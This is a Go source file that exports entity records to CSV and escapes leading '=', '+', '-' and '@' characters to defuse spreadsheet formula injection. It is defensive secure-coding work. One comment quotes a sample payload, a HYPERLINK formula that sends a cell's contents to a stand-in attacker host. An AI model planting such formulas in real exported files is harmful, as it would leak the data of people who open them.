package csvimport

import (
	"encoding/csv"
	"encoding/json"
	"fmt"
	"io"
	"strconv"

	"github.com/universaltill/universal-core/internal/kernel/entity"
)

// ExportCSV writes records as CSV to w: a header row of def's own field
// names (deterministic order — def.Fields' declared order, not Go's
// randomized map-iteration order a naive `for k := range record`
// would produce), then one data row per record. This is the "exporter"
// half of Farshid's original "dynamic importer exporter plugins" ask —
// import shipped first (this package's own doc comment); export is the
// same engine's mirror image, reusing formatValue/Coerce's shared
// string<->typed-value convention so a file this function writes
// re-imports through Preview/Commit with the same field names and
// per-type values, without a caller needing to hand-author a mapping —
// NOT a byte-for-byte round trip in every case, though: buildRowData
// trims whitespace and treats an empty string as absent on the way
// back in, so a FieldString value with leading/trailing whitespace or an
// empty string doesn't survive an export-then-reimport unchanged. A
// value escapeFormulaPrefix rewrites (see below) doesn't either, for a
// more important reason than whitespace.
//
// records is a plain []map[string]any, not a []data.Record — this
// package has no dependency on internal/data (its own doc comment: "an
// entity.Definition, an explicit column mapping, and a CSV file" is the
// whole contract), so a caller (internal/api/export.go) passes each
// record's own .Data map, not the wrapper type around it.
func ExportCSV(w io.Writer, def *entity.Definition, records []map[string]any) error {
	cw := csv.NewWriter(w)
	header := make([]string, len(def.Fields))
	for i, f := range def.Fields {
		header[i] = f.Name
	}
	if err := cw.Write(header); err != nil {
		return fmt.Errorf("write header row: %w", err)
	}
	for _, rec := range records {
		row := make([]string, len(def.Fields))
		for i, f := range def.Fields {
			cell := formatValue(rec[f.Name])
			// FieldNumber/FieldBool are excluded: their text is always
			// Go's own deterministic strconv formatting of an
			// already-type-checked value (entity.ValidateRecord already
			// required a real number/bool to get this far), never
			// attacker-authored free text — and a negative FieldNumber
			// genuinely starts with '-', which escapeFormulaPrefix must
			// not mangle into a text-prefixed non-number. Every other
			// field type (FieldString above all, but also FieldEnum/
			// FieldReference/FieldDate, which in practice never
			// legitimately start with a formula-trigger character) gets
			// the same defensive treatment rather than trying to prove
			// per-type which ones could theoretically hold attacker text.
			if f.Type != entity.FieldNumber && f.Type != entity.FieldBool {
				cell = escapeFormulaPrefix(cell)
			}
			row[i] = cell
		}
		if err := cw.Write(row); err != nil {
			return fmt.Errorf("write row: %w", err)
		}
	}
	cw.Flush()
	if err := cw.Error(); err != nil {
		return fmt.Errorf("flush csv writer: %w", err)
	}
	return nil
}

// escapeFormulaPrefix defuses CSV/formula injection (CWE-1236): Excel,
// Google Sheets, and LibreOffice all interpret a cell whose text begins
// with '=', '+', '-', or '@' as a formula to evaluate on open, not
// literal text. A FieldString value is the one place in this kernel a
// tenant's own free-typed text ends up in an exported cell verbatim —
// e.g. a vendor name of `=HYPERLINK("http://evil.example/"&A1,"click")`
// would otherwise execute the moment whoever runs this export opens the
// file in a spreadsheet app, no admin/database compromise required, just
// a value some tenant user typed into an ordinary text field. A leading
// single quote is the standard mitigation every one of those apps
// already honors as "treat this cell as literal text, not a formula" —
// deliberately not attempted for a value that's genuinely just a
// negative number or already known to be one of Coerce's own output
// shapes (see ExportCSV's own FieldNumber/FieldBool exclusion above).
func escapeFormulaPrefix(s string) string {
	if s == "" {
		return s
	}
	switch s[0] {
	case '=', '+', '-', '@':
		return "'" + s
	default:
		return s
	}
}

// formatValue renders one stored field value back to plain text — the
// exact reverse of Coerce, and only ever needs to handle the types
// Coerce/entity.ValidateRecord actually produce/accept (a JSON-decoded
// record's number is always float64, per encoding/json's own default —
// never int/int64, so there's no second numeric case to handle here):
// an absent/nil field (never set, or explicitly cleared) exports as an
// empty cell — the same "empty means absent" convention buildRowData
// uses on the way in, so re-importing this file leaves that field
// untouched rather than round-tripping a stray empty string.
func formatValue(v any) string {
	switch t := v.(type) {
	case nil:
		return ""
	case string:
		return t
	case bool:
		return strconv.FormatBool(t)
	case float64:
		return strconv.FormatFloat(t, 'f', -1, 64)
	case map[string]any:
		// An i18n_text value (ADR-0009) exports as its JSON object, the
		// exact string form Coerce parses back on re-import. An empty
		// object exports as an empty cell so it round-trips as "absent",
		// consistent with the nil case above.
		if len(t) == 0 {
			return ""
		}
		b, err := json.Marshal(t)
		if err != nil {
			return fmt.Sprintf("%v", t)
		}
		return string(b)
	default:
		// Unreachable for any value entity.ValidateRecord would have
		// accepted in the first place — falling back to fmt.Sprintf
		// rather than panicking keeps a genuinely unexpected stored
		// value (e.g. hand-inserted test data) exportable as *something*
		// instead of taking down the whole export.
		return fmt.Sprintf("%v", t)
	}
}
